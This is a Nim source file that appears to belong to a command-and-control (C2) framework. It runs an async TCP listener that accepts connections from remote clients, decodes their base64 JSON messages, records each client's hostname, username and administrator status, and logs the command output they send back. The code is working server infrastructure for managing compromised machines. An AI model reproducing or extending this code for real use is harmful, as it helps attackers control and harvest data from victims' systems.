import asyncdispatch, asyncnet, asyncfutures, strutils, json, base64

import ../types, ../logging, ../communication

proc processMessages(server: C2Server, tcpSocket: TCPSocket, client: C2Client) {.async.} =
  while true:
    let line = await tcpSocket.socket.recvLine()

    if line.len == 0:
      client.connected = false
      tcpSocket.socket.close()
      cDisconnected(client)  
      return
      
    let task = parseJson(decode(line))

    case task["task"].getStr():
    of "connect":
      await client.askToIdentify()
    of "identify":
      server.clients[client.id].loaded = true
      server.clients[client.id].hostname = task["hostname"].getStr()
      server.clients[client.id].username = task["username"].getStr()
      server.clients[client.id].isAdmin = task["isAdmin"].getBool()
    of "output":
      logClientOutput client, task["category"].getStr(), task["output"].getStr()
      if not server.clRespFuture.isNil():
        server.clRespFuture[].complete()
        server.clRespFuture[] = nil

proc createNewTcpListener*(server: C2Server, port = 12345, ip = "127.0.0.1") {.async.} =
  let id = len(server.tcpListeners)
  server.tcpListeners.add(
    TCPListener(
      sockets: @[], 
      port: port,
      listeningIP: ip,
      id: id, 
      socket: newAsyncSocket(),
      running: true
    )
  )
  let tcpServer = server.tcpListeners[id]
  tcpServer.socket.bindAddr(port.Port, ip)
  tcpServer.socket.listen()
  
  infoLog "listening on localhost:" & intToStr(port)
  
  while tcpServer.running:
    let 
      (netAddr, clientSocket) = await tcpServer.socket.acceptAddr()
      client = C2Client(
        listenerType: "tcp",
        listenerId: id,
        id: server.clients.len,
        connected: true,
        loaded: false,
        isAdmin: false,
        hostname: "placeholder",
        username: "placeholder",
        server: server
      )
      tcpSocket = TCPSocket(
        socket: clientSocket,
        id: client.id,
        netAddr: netAddr
      )

    server.clients.add(client)
    tcpServer.sockets.add(tcpSocket)

    cConnected(client)
    asyncCheck processMessages(server, tcpSocket, client)

  infoLog $tcpServer & " stopped"